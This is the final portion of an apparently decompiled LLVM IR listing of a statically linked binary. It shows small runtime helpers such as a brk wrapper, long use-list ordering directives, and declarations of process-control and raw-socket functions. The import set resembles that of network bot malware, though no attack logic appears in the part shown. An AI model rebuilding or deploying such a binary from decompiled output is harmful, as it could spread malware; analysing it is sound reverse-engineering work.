  uselistorder i32 2, { 5, 147, 268, 269, 62, 270, 271, 53, 272, 52, 273, 51, 151, 78, 79, 216, 80, 217, 81, 218, 6, 148, 274, 57, 82, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 149, 16, 17, 18, 19, 20, 84, 85, 83, 54, 55, 86, 168, 87, 90, 155, 162, 68, 152, 69, 153, 70, 154, 91, 156, 92, 157, 89, 158, 71, 159, 72, 160, 73, 161, 74, 167, 163, 164, 165, 166, 63, 93, 169, 21, 22, 170, 171, 172, 94, 173, 58, 150, 174, 88, 175, 23, 95, 181, 182, 24, 96, 97, 98, 183, 184, 99, 265, 101, 176, 103, 177, 102, 178, 100, 104, 179, 25, 26, 105, 180, 64, 106, 107, 108, 109, 65, 111, 112, 110, 113, 114, 115, 116, 117, 118, 56, 61, 185, 186, 187, 252, 253, 188, 189, 190, 191, 192, 193, 1, 27, 28, 29, 30, 31, 32, 119, 194, 75, 195, 196, 197, 198, 199, 2, 33, 34, 35, 36, 37, 38, 121, 120, 200, 201, 39, 202, 203, 59, 204, 123, 205, 3, 40, 41, 42, 43, 44, 124, 206, 122, 207, 208, 45, 209, 210, 60, 211, 126, 212, 4, 46, 47, 48, 49, 50, 127, 213, 125, 214, 219, 220, 221, 222, 223, 224, 225, 129, 226, 128, 227, 228, 229, 230, 231, 131, 130, 232, 233, 234, 235, 236, 237, 238, 239, 133, 240, 132, 241, 242, 243, 244, 135, 245, 136, 246, 247, 248, 249, 137, 250, 134, 251, 254, 255, 256, 257, 258, 259, 139, 260, 138, 261, 262, 140, 141, 76, 142, 263, 266, 143, 144, 77, 145, 267, 66, 264, 146, 67, 215 }
  uselistorder i32* @lr, { 49, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 1, 118, 119, 120, 2, 121, 122, 123, 3, 124, 125, 126, 127, 128, 129, 130, 131, 34, 35, 132, 133, 134, 135, 136, 87, 88, 89, 90, 91, 92, 93, 94, 36, 37, 38, 39, 40, 7, 95, 5, 6, 96, 50, 51, 97, 61, 62, 63, 64, 65, 52, 53, 54, 55, 56, 8, 9, 12, 13, 4, 0, 16, 14, 15, 10, 11, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 98, 99, 100, 101, 102, 103, 17, 18, 19, 20, 41, 42, 43, 44, 57, 58, 59, 60, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 104, 105, 106, 107, 45, 46, 47, 48 }
  uselistorder i32* @r1, { 50, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 1, 97, 98, 24, 25, 27, 26, 5, 7, 99, 0, 100, 48, 49, 19, 102, 65, 70, 71, 74, 72, 73, 66, 67, 68, 69, 64, 75, 101, 11, 6, 51, 28, 76, 29, 3, 77, 30, 31, 12, 8, 9, 10, 14, 13, 18, 78, 15, 16, 17, 20, 21, 22, 23, 32, 33, 34, 4, 35, 59, 60, 2, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 52, 53, 54, 55, 56, 57, 58, 61, 62, 63, 79 }
  uselistorder label %dec_label_pc_14290, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_14204, { 1, 0 }
}

define i32 @function_1429c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1429c:
  %v3_1429c = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_142a4 = call i32 @function_11b48()
  %v0_142a8 = load i32, i32* @r4, align 4
  store i32 %v3_1429c, i32* @r4, align 4
  %v2_142b0 = call i32 @function_11bf0(i32 %v0_142a4, i32 %v0_142a8)
  ret i32 %v2_142b0

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_11bf0, { 5, 1, 0, 4, 3, 2 }
  uselistorder i32 ()* @function_11b48, { 0, 3, 1, 2 }
}

define i32 @function_142b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_142b4:
  %v1_142b4 = add i32 %arg1, 28
  %v2_142b4 = inttoptr i32 %v1_142b4 to i32*
  %v3_142b4 = load i32, i32* %v2_142b4, align 4
  %v1_142bc = add i32 %arg1, 44
  %v2_142bc = inttoptr i32 %v1_142bc to i32*
  %v3_142bc = load i32, i32* %v2_142bc, align 4
  store i32 %v3_142b4, i32* @global_var_1ccd8.476, align 4
  store i32 %v3_142bc, i32* @global_var_1ccdc.478, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 44, { 11, 0, 3, 4, 1, 2, 9, 10, 5, 6, 7, 8 }
  uselistorder i32 28, { 28, 0, 18, 19, 7, 8, 27, 1, 9, 10, 11, 12, 13, 14, 15, 2, 6, 17, 16, 3, 4, 5, 20, 21, 22, 23, 24, 25, 26 }
}

define i32 @function_142d8(i32* %arg1) local_unnamed_addr {
dec_label_pc_142d8:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_142e0 = call i32 @brk(i32* %arg1)
  %v3_142e4 = icmp ult i32 %v2_142e0, %tmp
  store i32 %v2_142e0, i32* @global_var_1cb18.473, align 4
  br i1 %v3_142e4, label %dec_label_pc_142f8, label %dec_label_pc_14308

dec_label_pc_142f8:                               ; preds = %dec_label_pc_142d8
  %v0_142f8 = call i32 @function_120c4()
  %v2_14300 = inttoptr i32 %v0_142f8 to i32*
  store i32 12, i32* %v2_14300, align 4
  br label %dec_label_pc_14308

dec_label_pc_14308:                               ; preds = %dec_label_pc_142d8, %dec_label_pc_142f8
  %v0_14308 = phi i32 [ 0, %dec_label_pc_142d8 ], [ -1, %dec_label_pc_142f8 ]
  ret i32 %v0_14308

; uselistorder directives
  uselistorder i32 12, { 17, 11, 117, 118, 119, 121, 122, 123, 124, 12, 120, 125, 126, 127, 128, 129, 130, 131, 64, 65, 30, 31, 66, 18, 19, 112, 113, 114, 0, 109, 115, 8, 116, 9, 110, 4, 111, 20, 21, 6, 67, 68, 22, 69, 70, 23, 13, 35, 36, 44, 47, 41, 48, 37, 32, 33, 34, 38, 39, 40, 42, 45, 46, 43, 49, 50, 51, 10, 52, 53, 54, 56, 57, 58, 29, 24, 59, 25, 60, 26, 61, 5, 62, 55, 7, 63, 105, 71, 72, 73, 74, 27, 75, 76, 77, 78, 79, 28, 80, 81, 82, 83, 84, 85, 14, 86, 87, 88, 89, 90, 91, 15, 92, 93, 16, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 106, 107, 108, 1, 2, 3 }
  uselistorder i32 ()* @function_120c4, { 18, 57, 29, 40, 9, 8, 7, 6, 39, 38, 37, 5, 58, 28, 27, 42, 41, 17, 10, 56, 55, 16, 21, 20, 15, 32, 54, 23, 53, 52, 14, 13, 36, 35, 34, 51, 22, 31, 4, 3, 50, 44, 33, 24, 49, 2, 12, 48, 26, 11, 25, 19, 1, 0, 47, 46, 45, 43, 30 }
  uselistorder i32* @global_var_1cb18.473, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_14308, { 1, 0 }
}

define i32 @function_14314(i32 %arg1) local_unnamed_addr {
dec_label_pc_14314:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14318 = load i32, i32* @global_var_1c8e8.436, align 4
  %v7_1431c = icmp eq i32 %v3_14318, -1
  %v3_14320 = load i32, i32* @r4, align 4
  store i32 %v3_14320, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_1c8e8.436 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_1431c, label %bb, label %.preheader

bb:                                               ; preds = %dec_label_pc_14314
  store i32 %v3_14320, i32* %r4.global-to-local, align 4
  %v9_14328 = load i32, i32* @r0, align 4
  ret i32 %v9_14328

.preheader:                                       ; preds = %dec_label_pc_14314, %.preheader
  %v0_14330 = phi i32 [ %v3_14334, %.preheader ], [ %v3_14318, %dec_label_pc_14314 ]
  call void @__pseudo_branch(i32 %v0_14330)
  %v0_14334 = load i32, i32* %r4.global-to-local, align 4
  %v1_14334 = add i32 %v0_14334, -4
  %v2_14334 = inttoptr i32 %v1_14334 to i32*
  %v3_14334 = load i32, i32* %v2_14334, align 4
  store i32 %v1_14334, i32* %r4.global-to-local, align 4
  %v3_14338 = icmp eq i32 %v3_14334, -1
  br i1 %v3_14338, label %dec_label_pc_14340, label %.preheader

dec_label_pc_14340:                               ; preds = %.preheader
  %v2_14340 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14340, i32* %r4.global-to-local, align 4
  %v8_14340 = load i32, i32* @r0, align 4
  ret i32 %v8_14340

; uselistorder directives
  uselistorder i32 %v3_14334, { 1, 0 }
  uselistorder i32 %v3_14318, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 45, 16, 46, 47, 48, 3, 17, 18, 19, 49, 50, 51, 4, 20, 21, 22, 52, 53, 54, 5, 23, 24, 55, 15, 14, 56, 57, 58, 13, 12, 11, 10, 25, 26, 27, 28, 29, 0, 30, 1, 31, 2, 59, 9, 32, 36, 37, 43, 38, 33, 34, 39, 40, 41, 42, 44, 8, 7, 35, 6 }
  uselistorder i32 -1, {}
  uselistorder i32* @global_var_1c8e8.436, { 1, 0 }
  uselistorder i32 1, { 555, 92, 355, 396, 935, 936, 937, 938, 939, 377, 556, 316, 1026, 361, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 559, 558, 557, 322, 323, 326, 325, 321, 320, 324, 318, 327, 319, 328, 560, 165, 164, 160, 162, 161, 163, 166, 159, 733, 188, 185, 187, 186, 561, 189, 562, 107, 108, 563, 168, 80, 564, 329, 565, 291, 566, 314, 567, 293, 855, 856, 568, 306, 302, 307, 303, 304, 308, 305, 857, 858, 859, 444, 112, 113, 109, 111, 110, 569, 311, 570, 97, 0, 574, 573, 572, 571, 133, 132, 445, 575, 122, 123, 378, 446, 576, 124, 577, 933, 582, 581, 580, 579, 578, 287, 288, 289, 290, 447, 583, 356, 833, 348, 834, 379, 584, 149, 155, 148, 152, 151, 154, 156, 150, 153, 1039, 380, 587, 586, 585, 301, 300, 588, 210, 211, 209, 212, 144, 145, 146, 147, 589, 242, 243, 241, 240, 239, 590, 591, 313, 312, 592, 381, 1013, 593, 157, 158, 448, 449, 353, 597, 596, 595, 594, 68, 67, 362, 598, 50, 599, 284, 278, 600, 233, 601, 213, 602, 95, 603, 54, 604, 190, 605, 191, 606, 21, 607, 17, 608, 940, 339, 18, 19, 20, 734, 735, 736, 737, 738, 739, 740, 1040, 31, 32, 28, 29, 30, 609, 450, 451, 610, 24, 23, 25, 22, 404, 860, 611, 223, 405, 613, 612, 53, 52, 614, 26, 615, 27, 616, 37, 617, 33, 34, 618, 61, 619, 96, 620, 35, 621, 36, 622, 125, 38, 623, 167, 624, 62, 625, 317, 626, 299, 627, 315, 628, 262, 292, 64, 406, 770, 771, 407, 1014, 1015, 333, 1016, 861, 862, 863, 349, 864, 631, 630, 629, 16, 13, 9, 10, 12, 11, 8, 14, 15, 1, 835, 836, 837, 838, 363, 941, 942, 364, 943, 633, 632, 310, 309, 865, 866, 867, 452, 634, 79, 78, 77, 76, 1017, 382, 383, 2, 443, 1018, 635, 194, 192, 195, 196, 193, 767, 769, 768, 453, 868, 295, 294, 984, 170, 869, 870, 871, 65, 66, 944, 636, 98, 99, 100, 101, 969, 970, 637, 282, 281, 280, 279, 283, 945, 946, 638, 255, 254, 253, 252, 256, 454, 747, 455, 748, 408, 749, 750, 772, 751, 758, 759, 764, 461, 741, 742, 463, 743, 744, 462, 745, 746, 752, 464, 753, 385, 465, 466, 460, 754, 755, 459, 756, 757, 458, 760, 761, 457, 762, 763, 456, 765, 766, 773, 467, 354, 774, 468, 775, 777, 778, 776, 779, 469, 780, 732, 384, 783, 781, 470, 782, 785, 471, 786, 787, 788, 398, 789, 790, 386, 796, 797, 350, 472, 652, 651, 650, 649, 648, 647, 646, 645, 644, 643, 642, 641, 640, 639, 82, 81, 83, 87, 89, 85, 84, 86, 88, 91, 90, 791, 792, 473, 793, 794, 474, 795, 653, 277, 276, 271, 275, 274, 273, 270, 272, 784, 475, 655, 654, 297, 298, 296, 803, 804, 805, 806, 807, 808, 809, 334, 347, 810, 811, 387, 335, 812, 813, 814, 815, 336, 346, 816, 817, 388, 337, 818, 476, 820, 821, 477, 822, 819, 823, 401, 824, 365, 827, 828, 825, 826, 340, 338, 341, 829, 478, 830, 662, 661, 549, 660, 659, 658, 548, 657, 656, 40, 42, 39, 45, 44, 48, 49, 41, 47, 43, 46, 663, 106, 1020, 366, 1019, 397, 664, 228, 229, 227, 226, 225, 231, 232, 224, 230, 947, 666, 665, 57, 58, 60, 56, 55, 59, 667, 410, 798, 799, 409, 800, 479, 481, 480, 482, 801, 802, 483, 484, 485, 486, 487, 488, 489, 490, 678, 677, 676, 675, 674, 673, 672, 671, 670, 554, 669, 668, 171, 172, 174, 173, 491, 351, 492, 679, 411, 831, 493, 494, 680, 497, 496, 495, 832, 682, 681, 498, 839, 390, 840, 841, 499, 389, 842, 500, 843, 501, 844, 502, 845, 503, 846, 504, 847, 505, 848, 506, 849, 507, 850, 508, 851, 509, 852, 510, 853, 511, 854, 352, 512, 698, 697, 696, 695, 694, 693, 692, 691, 690, 689, 688, 687, 686, 685, 684, 683, 259, 257, 258, 260, 261, 877, 4, 872, 513, 873, 3, 874, 399, 875, 357, 358, 876, 878, 400, 879, 702, 701, 700, 550, 551, 699, 993, 412, 994, 413, 995, 5, 996, 6, 7, 880, 881, 882, 883, 884, 885, 514, 886, 367, 515, 516, 887, 414, 888, 703, 177, 175, 176, 181, 182, 184, 183, 179, 180, 178, 889, 890, 391, 891, 892, 893, 517, 894, 368, 518, 416, 415, 519, 895, 520, 896, 704, 236, 237, 238, 235, 234, 897, 898, 392, 899, 900, 901, 521, 902, 369, 522, 421, 420, 523, 903, 417, 904, 418, 905, 419, 906, 709, 708, 707, 706, 705, 266, 265, 267, 268, 263, 264, 269, 907, 908, 393, 909, 910, 911, 524, 912, 370, 525, 429, 428, 526, 913, 427, 914, 422, 915, 423, 916, 424, 917, 425, 918, 527, 919, 426, 920, 714, 713, 712, 711, 710, 71, 72, 73, 75, 69, 70, 74, 948, 949, 950, 951, 952, 953, 359, 360, 954, 955, 956, 957, 958, 959, 960, 961, 528, 962, 963, 529, 964, 967, 965, 966, 717, 716, 715, 198, 202, 201, 197, 204, 205, 208, 206, 199, 207, 203, 200, 971, 972, 973, 974, 975, 530, 371, 531, 719, 718, 222, 218, 214, 215, 220, 221, 219, 216, 217, 976, 977, 978, 394, 979, 980, 981, 372, 532, 432, 431, 533, 982, 430, 983, 720, 116, 115, 118, 119, 121, 120, 114, 117, 985, 986, 987, 395, 988, 989, 990, 373, 534, 435, 434, 535, 991, 433, 992, 725, 724, 723, 722, 721, 137, 136, 134, 142, 141, 143, 140, 135, 139, 138, 997, 998, 999, 536, 1000, 1001, 1002, 1003, 1004, 1005, 537, 1006, 374, 538, 437, 436, 539, 1007, 726, 245, 248, 249, 251, 250, 247, 246, 244, 1008, 402, 343, 1009, 540, 1011, 1010, 342, 541, 439, 438, 552, 727, 286, 285, 1021, 403, 345, 1022, 542, 1024, 1023, 344, 543, 441, 440, 553, 728, 94, 93, 1012, 442, 544, 729, 103, 104, 105, 102, 1025, 51, 921, 169, 922, 545, 925, 546, 926, 927, 923, 924, 928, 929, 930, 931, 375, 932, 376, 126, 129, 131, 127, 128, 130, 934, 547, 968, 63, 730, 731, 332, 331, 330 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_14348() local_unnamed_addr {
dec_label_pc_14348:
  %v5_1434c = load i32, i32* @r0, align 4
  ret i32 %v5_1434c

; uselistorder directives
  uselistorder i32* @r0, { 6, 12, 13, 121, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 82, 83, 85, 84, 29, 168, 169, 37, 38, 39, 40, 20, 5, 16, 17, 119, 120, 30, 170, 171, 69, 173, 11, 14, 136, 15, 135, 132, 35, 134, 26, 133, 137, 172, 46, 21, 86, 87, 88, 89, 33, 23, 90, 91, 92, 93, 24, 174, 8, 19, 47, 25, 138, 18, 139, 140, 22, 94, 141, 9, 95, 10, 96, 97, 0, 41, 48, 49, 43, 44, 45, 42, 50, 53, 54, 55, 56, 57, 1, 51, 52, 65, 66, 67, 58, 59, 60, 61, 62, 63, 64, 31, 68, 70, 71, 72, 73, 74, 75, 76, 77, 32, 78, 79, 80, 81, 98, 99, 100, 101, 102, 103, 104, 3, 105, 106, 107, 108, 109, 110, 111, 34, 112, 129, 130, 2, 113, 114, 115, 116, 122, 123, 124, 125, 126, 127, 128, 131, 117, 118, 4, 7, 27, 28, 36 }
}

define i32 @function_14350() local_unnamed_addr {
entry:
  %v3_14354 = load i32, i32* @r4, align 4
  %v0_1435c = call i32 @function_80b0()
  call void @__pseudo_branch(i32 %v3_14354)
  ret i32 %v0_1435c

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 0, 7, 12, 13, 9, 10, 11, 14, 2, 5, 6, 3, 4, 1, 8 }
  uselistorder i32 0, { 120, 0, 867, 868, 869, 870, 122, 121, 871, 1023, 1024, 1025, 1026, 1027, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1028, 1029, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 40, 1048, 1049, 1050, 1051, 1052, 41, 1053, 1054, 1055, 42, 1056, 1057, 1058, 43, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1074, 1075, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 44, 1094, 1095, 1096, 1097, 1098, 45, 1099, 1100, 1101, 1102, 1103, 46, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 719, 720, 281, 721, 282, 578, 973, 974, 975, 976, 853, 722, 723, 1117, 1118, 1119, 1120, 283, 724, 1, 725, 726, 727, 1121, 1122, 1123, 123, 1124, 74, 1125, 72, 73, 1126, 1127, 1128, 284, 1132, 285, 1143, 1145, 520, 223, 1146, 286, 1144, 287, 288, 2, 1129, 1130, 124, 854, 240, 855, 291, 242, 241, 856, 857, 858, 859, 290, 861, 862, 289, 863, 1131, 684, 685, 686, 687, 688, 689, 126, 90, 690, 75, 125, 127, 293, 1133, 294, 243, 1134, 1135, 1137, 1138, 292, 979, 981, 982, 50, 224, 983, 980, 977, 978, 3, 961, 964, 962, 963, 225, 4, 986, 984, 985, 226, 128, 965, 966, 967, 971, 968, 969, 295, 5, 970, 6, 993, 994, 129, 987, 988, 989, 990, 991, 992, 7, 8, 860, 579, 580, 581, 296, 9, 297, 995, 942, 516, 943, 517, 996, 822, 582, 691, 583, 584, 997, 998, 872, 1147, 1148, 65, 728, 298, 729, 730, 731, 732, 299, 733, 734, 735, 736, 737, 738, 739, 585, 692, 823, 1136, 586, 664, 740, 873, 587, 518, 1139, 78, 1140, 1021, 588, 864, 1022, 865, 944, 1141, 1142, 10, 589, 91, 590, 591, 220, 219, 521, 79, 80, 81, 82, 531, 522, 52, 51, 92, 592, 593, 594, 595, 597, 596, 11, 999, 1000, 222, 221, 523, 83, 84, 85, 86, 532, 524, 54, 53, 49, 62, 1001, 533, 1002, 1003, 1004, 87, 1005, 1006, 1007, 1008, 1009, 130, 525, 534, 526, 527, 1010, 535, 100, 131, 741, 742, 88, 743, 744, 536, 12, 227, 132, 133, 275, 55, 134, 300, 598, 76, 745, 746, 1012, 1011, 1013, 1014, 47, 135, 1015, 138, 137, 136, 276, 277, 278, 140, 139, 141, 301, 747, 748, 142, 928, 929, 101, 143, 749, 144, 599, 145, 903, 904, 146, 874, 875, 555, 528, 605, 600, 93, 601, 602, 556, 557, 568, 549, 537, 306, 550, 551, 538, 308, 552, 553, 539, 307, 554, 574, 575, 558, 559, 560, 147, 148, 561, 562, 563, 564, 540, 305, 565, 566, 541, 304, 567, 569, 542, 303, 570, 577, 543, 302, 571, 576, 572, 69, 56, 102, 103, 573, 519, 603, 309, 604, 229, 606, 310, 607, 610, 611, 150, 228, 608, 609, 311, 312, 612, 613, 244, 614, 615, 616, 617, 618, 619, 544, 66, 313, 621, 622, 623, 624, 625, 626, 627, 237, 236, 628, 314, 629, 89, 630, 631, 104, 632, 530, 633, 634, 635, 636, 637, 638, 529, 639, 640, 641, 149, 315, 316, 642, 645, 646, 647, 648, 649, 151, 643, 152, 644, 13, 153, 620, 665, 666, 667, 71, 57, 668, 70, 58, 669, 670, 671, 672, 673, 317, 674, 675, 677, 154, 676, 67, 678, 15, 14, 679, 876, 877, 650, 651, 155, 652, 653, 654, 655, 656, 657, 658, 245, 318, 659, 68, 319, 660, 16, 661, 238, 662, 320, 663, 680, 321, 322, 681, 682, 683, 323, 693, 694, 695, 279, 159, 158, 545, 546, 280, 157, 156, 231, 235, 324, 696, 160, 161, 706, 697, 698, 699, 700, 701, 702, 703, 704, 705, 230, 325, 707, 326, 708, 327, 709, 328, 710, 329, 711, 712, 330, 713, 714, 715, 716, 246, 717, 59, 718, 162, 163, 331, 77, 750, 751, 752, 753, 234, 754, 755, 756, 233, 757, 758, 759, 760, 96, 761, 763, 762, 94, 95, 164, 232, 332, 764, 249, 247, 248, 97, 165, 63, 166, 766, 767, 108, 105, 106, 107, 17, 765, 768, 769, 770, 771, 772, 773, 20, 21, 22, 23, 24, 774, 775, 167, 251, 776, 333, 777, 334, 778, 335, 779, 336, 780, 337, 781, 338, 782, 250, 783, 168, 169, 170, 785, 786, 784, 788, 789, 787, 25, 26, 27, 28, 29, 790, 171, 791, 792, 253, 793, 339, 794, 340, 795, 341, 796, 342, 797, 343, 798, 344, 799, 252, 800, 345, 801, 173, 172, 174, 803, 804, 802, 805, 806, 60, 808, 809, 810, 811, 346, 812, 30, 31, 32, 33, 34, 807, 175, 98, 813, 814, 258, 815, 257, 816, 256, 817, 254, 818, 255, 819, 347, 820, 348, 821, 177, 176, 178, 825, 826, 824, 827, 828, 61, 830, 831, 832, 833, 349, 834, 35, 36, 37, 38, 39, 829, 179, 99, 835, 836, 260, 837, 259, 838, 350, 839, 878, 112, 111, 109, 110, 879, 880, 64, 881, 882, 883, 884, 885, 180, 886, 887, 351, 888, 889, 890, 891, 184, 181, 182, 183, 892, 893, 894, 895, 352, 896, 897, 263, 899, 262, 900, 261, 901, 353, 902, 905, 906, 115, 113, 114, 18, 907, 908, 909, 910, 185, 911, 912, 265, 264, 913, 354, 914, 186, 189, 188, 187, 917, 918, 916, 915, 355, 920, 919, 921, 190, 922, 923, 268, 924, 267, 925, 266, 926, 356, 927, 191, 194, 193, 192, 932, 933, 931, 930, 935, 934, 936, 937, 195, 271, 938, 270, 939, 269, 940, 357, 941, 945, 946, 947, 948, 119, 116, 117, 118, 19, 949, 950, 951, 196, 952, 197, 953, 954, 274, 955, 273, 956, 272, 957, 358, 958, 202, 360, 200, 201, 198, 199, 959, 204, 203, 960, 361, 205, 359, 210, 363, 208, 209, 206, 207, 1016, 212, 211, 1017, 213, 362, 239, 972, 1018, 214, 1019, 840, 215, 841, 842, 216, 843, 844, 845, 217, 364, 846, 847, 48, 848, 849, 850, 851, 852, 365, 866, 218, 898, 1020, 547, 548, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163 }
  uselistorder i32* @r4, {}
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @getppid() local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @getsockopt(i32, i32, i32, i32*, i32*) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @recvfrom(i32, i32*, i32, i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
